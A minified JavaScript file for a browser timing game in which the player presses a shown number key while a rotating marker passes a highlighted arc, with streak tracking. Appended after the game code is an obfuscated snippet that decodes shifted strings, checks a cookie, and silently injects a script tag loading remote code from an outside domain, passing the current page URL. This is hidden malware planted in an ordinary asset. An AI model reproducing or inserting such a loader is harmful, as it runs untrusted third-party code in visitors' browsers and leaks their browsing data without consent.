let key_to_press,g_start,g_end,animation_loop,canvas=document.getElementById("canvas"),ctx=canvas.getContext("2d"),W=canvas.width,H=canvas.height,degrees=0,new_degrees=0,time=0,color="#ff0000",txtcolor="#ffffff",bgcolor="#404b58",bgcolor2="#41a491",bgcolor3="#00ff00",streak=0,max_streak=0;function getRandomInt(min,max){return min=Math.ceil(min),max=Math.floor(max),Math.floor(Math.random()*(max-min+1)+min)}function init(correct){ctx.clearRect(0,0,W,H),ctx.beginPath(),ctx.strokeStyle=bgcolor,ctx.lineWidth=20,ctx.arc(W/2,H/2,100,0,2*Math.PI,!1),ctx.stroke(),ctx.beginPath(),ctx.strokeStyle=!0===correct?bgcolor3:bgcolor2,ctx.lineWidth=20,ctx.arc(W/2,H/2,100,g_start-90*Math.PI/180,g_end-90*Math.PI/180,!1),ctx.stroke();let radians=degrees*Math.PI/180;ctx.beginPath(),ctx.strokeStyle=color,ctx.lineWidth=40,ctx.arc(W/2,H/2,90,radians-.1-90*Math.PI/180,radians-90*Math.PI/180,!1),ctx.stroke(),ctx.fillStyle=txtcolor,ctx.font="100px sans-serif";let text_width=ctx.measureText(key_to_press).width;ctx.fillText(key_to_press,W/2-text_width/2,H/2+35)}function draw(){void 0!==typeof animation_loop&&clearInterval(animation_loop),document.querySelector(".stats .streak").innerHTML=streak,document.querySelector(".stats .max-streak").innerHTML=max_streak,g_start=getRandomInt(20,40)/10,g_end=getRandomInt(3,5)/10,g_end=g_start+g_end,degrees=0,new_degrees=360,key_to_press=""+getRandomInt(1,4),time=6*getRandomInt(1,3),animation_loop=setInterval(animate_to,time)}function animate_to(){if(degrees>=new_degrees)return document.querySelector(".text.status").innerHTML="Skipped!",console.log("Failed: timeout!"),wrong(),void draw();degrees+=2,init()}function correct(){document.querySelector(".stats").classList.remove("wrong"),streak>max_streak&&(max_streak=streak),streak++}function wrong(){document.querySelector(".stats").classList.add("wrong"),streak>max_streak&&(max_streak=streak),streak=0}document.addEventListener("keydown",(function(ev){let key_pressed=ev.key;if(["1","2","3","4"].includes(key_pressed)){if(bgcolor3="#ff0000",key_pressed===key_to_press){let d_start=180/Math.PI*g_start,d_end=180/Math.PI*g_end;degrees<d_start?(document.querySelector(".text.status").innerHTML="Too soon!",wrong()):degrees>d_end?(document.querySelector(".text.status").innerHTML="Too late!",wrong()):(document.querySelector(".text.status").innerHTML="Success!",bgcolor3="#00ff00",correct())}else document.querySelector(".text.status").innerHTML="Failed: Pressed "+key_pressed,console.log("Failed: Pressed "+key_pressed+" instead of "+key_to_press),wrong();init(!0),clearInterval(animation_loop),setTimeout((function(){draw()}),500)}})),draw();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));